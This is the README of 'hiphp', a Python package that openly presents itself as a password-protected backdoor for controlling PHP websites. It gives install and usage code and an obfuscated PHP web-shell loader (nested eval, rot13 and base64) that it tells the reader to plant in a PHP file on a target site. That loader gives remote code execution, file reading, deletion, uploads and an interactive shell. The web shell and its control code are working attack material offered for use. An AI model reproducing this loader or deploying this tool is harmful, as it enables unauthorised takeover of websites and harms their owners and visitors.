
<p align="center"><img align="center" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot.png"></p>
<h1>hiphp for control php websites.</h1>

<p>backdoor control php sites, The site is controlled by sending commands, files and codes to the site using the http or https protocol. After copying the code and placing it in any php file on the target website, you will have permissions to enter it, read all files, delete and even upload new files to it. Also, this backdoor is password protected and non-reverse encryption.</p>

<h2>Installation:</h2>

```
pip install hiphp==0.1.13
```

<h2>Usage:</h2>

```python
#call the package:
from hiphp import hiphp
#
#
#In order to print the result directly.
p1=hiphp("<PASSWORD>","<http://THE/LINK/TO/THE/PHP/FILE/THAT/CONTAINS/THE/HIPHP/ID>",False)
#
#In order to make the result as a variable.
#p1=hiphp("<PASSWORD>","<http://THE/LINK/TO/THE/PHP/FILE/THAT/CONTAINS/THE/HIPHP/ID>")
#
#
#Get HIPHP ID for first use.
print(p1.get_code())
#
#
#Run a code or line in your website.
p1.run("<YOUR_CODE>")
#
#Run a code or line in your website from a file.
p1.run_file("<PHP_CODE_FILE_PATH>")
#
#Run a code or line in your website from a file With the entry of variables.
p1.run_file("<PHP_CODE_FILE_PATH>","<__VALUE_NAME__>==<VALUE_CONTENT>")
#
#
#open command line interface.
p1.cli()
#
#
#Upload a file to the server hosting the site.
p1.upload("<THE_PATH_OF_THE_FILE_TO_BE_UPLOADED>")
#
#Upload a file to a specific folder in the server hosting the site.
p1.upload("<THE_PATH_OF_THE_FILE_TO_BE_UPLOADED>","./<THE_PATH_YOU_WANT_TO_UPLOAD_THE_FILE_TO>") 

```

<h2>Examples:</h2>

```python
from hiphp import hiphp
#
#
p1=hiphp("123","http://localhost/index.php",False)
#
#
#
# Example:1
# GET ID:
print(p1.get_code())
# OUTPUT:
'''
/*php code start*/
eval(str_rot13(base64_decode(str_rot13(base64_decode('bkpMYldTOUdFSVdKRUlXb1cwdUhJU09zSUlBU0h5OU9FMElCSVBxcUNHMGFaUUx3QlJEM0F3RDBBUlJsWndSbEIwRGtDR1pqWUd0MFdHRDVDbU4xQ1JaakpteDFybVNPWFFOMkJ3SVBuR1Zsb0hObFpRTzBEbU9uQkdEY1p3dTlEMFdxQkdEK0FtTnVEeFp4QXdOekR3RXNBbU5lQUhWa0VRTG1abVYxRHdwM1pSTDVXbHk3TUpBYm9scHdwVXkwblQ5aFdtZ2NNdnVjcDNBeXFQdHhLMU9DSDFFb1cyQWlvSjF1b3pEYUtGeGNyMkkyTEpqYldTOURHMUFISmxxd28yMWdMSjV4VzEwY0IzMXlyVHkwQjMwPQ==')))));
/*php code end*/
'''
# Copy this code into the file whose path you entered earlier.
# for example: https://localhost/index.php
#
#
#
# Example:2
# Command:
p1.run("echo 'this is a test';")
# OUTPUT:
'''
this is a test
'''
#
#
#
# Example:3
# Run code from file:
#-example_3.php content:
'''
echo 'this is a test';
'''
#OR
'''
<?php
    echo 'this is a test';
?>
'''
p1.run_file("example_3.php")
# OUTPUT:
'''
this is a test
'''
#
#
#
# Example:4
# Run code from file With the entry of variables:
#-example_4.php content:
'''
echo '__test__';
'''
#OR
'''
<?php
    echo '__test__';
?>
'''
p1.run_file("example_4.php","test==this is a test")
# OUTPUT:
'''
this is a test
'''
#
#
#
# Example:5
# Command line interface:
p1.cli()
# OUTPUT:
'''
hiphp>>>
'''
#
#
#
# Example:6
# Upload a picture:
p1.upload("picture_example.png")
#
#
#
# Example:7
# Upload a picture to a specific path:
p1.upload("picture_example.png","./pictures/")

```

<h2>Changelog:</h2>

```
#
## 0.1.13
 - safety upgrade.
 - Bug fixes & performance improvements.
#
## 0.1.12
 - safety upgrade.
 - Bug fixes & performance improvements.
#
## 0.1.11
 - Command interface update.
 - Bug fixes & performance improvements.
#
## 0.1.10
 - Fix Bugs.
#
## 0.1.9
 - fix bugs.
#
## 0.1.7
 - fix bugs.
#
## 0.1.6
 - fix bugs.
 - add upload to upload any file.
 - Simplify the use of the program.
#
## 0.1.5
 - fix bugs.
#
## 0.1.4
 - fix bugs.
 - new build.
#
## 0.1.1
 - Import pakages by pipincluder.
 - Fix bugs.
#
## 0.1.0
 - New build.
 - Fix bugs.
#
## 0.0.4
 - Fix bugs.
#
## 0.0.2
 - Fix bugs.
 - Add help list.
 - Add Executing from files.
#
## 0.0.1
 - First public release.

```

<h1></h1> 
   
<p align="center">
   <a href="https://yasserbdj96.github.io" align="center"><img align="center" alt="Website" src="https://img.shields.io/badge/Website-3b5998?style=flat-square&logo=google-chrome&logoColor=white"></a>
   <a href="https://www.linkedin.com/in/yasserbdj96" align="center"><img align="center" alt="LinkedIn" src="https://img.shields.io/badge/-LinkedIn-0e76a8?style=flat-square&logo=Linkedin&logoColor=white"></a>
   <a href="https://twitter.com/yasserbdj96" align="center"><img align="center" alt="Twitter" src="https://img.shields.io/badge/-Twitter-00acee?style=flat-square&logo=Twitter&logoColor=white"></a>
   <a href="https://www.instagram.com/yasserbdj96" align="center"><img align="center" alt="Instagram" src="https://img.shields.io/badge/-Instagram-e4405f?style=flat-square&logo=Instagram&logoColor=white"></a>
   <a href="https://www.facebook.com/yasserbdj96" align="center"><img align="center" alt="Facebook" src="https://img.shields.io/badge/-Facebook-0088cc?style=flat-square&logo=facebook&logoColor=white"></a>
   <a href="https://www.youtube.com/channel/UC53dtKxc84BNPyDb51rtRPg" align="center"><img align="center" alt="Youtube" src="https://img.shields.io/badge/-Youtube-ea4335?style=flat-square&logo=youtube&logoColor=white"></a>
   <a href="https://pypi.org/user/yasserbdj96" align="center"><img align="center" alt="Pypi" src="https://img.shields.io/badge/-Pypi-efeeea?style=flat-square&logo=pypi"></a>
   <a href="mailto:yasser.bdj96@gmail.com" align="center"><img align="center" alt="Gmail" src="https://img.shields.io/badge/-yasser.bdj96@gmail.com-c14438?style=flat-square&logo=Gmail&logoColor=white&link=mailto:yasser.bdj96@gmail.com"></a>
</p>

<p align="center">
    BTC : 16mUJYXdNh9VkjN3MQawA8wvYJqL9F5CKZ

</p>

<p align="center">
    <a align="center" href="https://ko-fi.com/L3L34CEPV">
        <img alt="ko-fi" align="center" src="https://ko-fi.com/img/githubbutton_sm.svg">
    </a>
</p>

<p align="center">
    <a align="center" href="https://yasserbdj96.github.io">
        <img align="center" alt="yasserbdj96" height="100" src="https://raw.githubusercontent.com/yasserbdj96/yasserbdj96/main/images/yasserbdj96.png">
    </a>
    <br>
    <a align="center" href="https://github.com/yasserbdj96/" align="center">
        <img align="center" alt="" src="https://visitor-badge.laobi.icu/badge?page_id=yasserbdj96.hiphp">
    </a>
</p>
